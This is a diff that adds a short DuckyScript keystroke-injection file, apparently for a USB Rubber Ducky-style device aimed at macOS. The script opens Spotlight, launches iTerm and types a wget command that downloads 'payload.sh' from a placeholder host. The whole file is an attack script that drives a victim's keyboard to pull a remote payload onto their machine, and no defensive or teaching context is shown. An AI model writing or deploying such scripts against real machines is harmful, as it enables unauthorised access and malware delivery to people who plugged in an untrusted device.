@@ -1,0 +1,11 @@
+DELAY 1000
+REM Open Spotlight
+COMMAND SPACE
+DELAY 500
+STRING iTerm
+DELAY 500
+ENTER
+DELAY 1500
+REM Run wget command
+STRING wget http://example.com/payload.sh
+ENTER
